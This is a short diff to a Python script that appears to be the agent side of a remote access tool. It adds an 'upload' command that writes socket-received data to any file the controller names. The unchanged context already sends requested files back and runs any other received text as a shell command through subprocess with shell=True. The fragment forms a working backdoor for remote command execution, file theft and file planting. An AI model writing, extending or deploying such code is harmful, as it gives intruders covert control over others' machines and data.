@@ -27,6 +27,14 @@ while True:
                 cs.send(contents)
             else:
                 cs.send(b"Error: File not found on agent side.")
+
+        elif msg_parts[0] == 'upload':
+            filename = msg_parts[1]
+            with open(filename, 'wb') as f:
+                contents = cs.recv(2048) 
+                f.write(contents)
+            cs.send(b"File Upload Successful.")
+
         else:
             p = subprocess.Popen(
                 msg_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
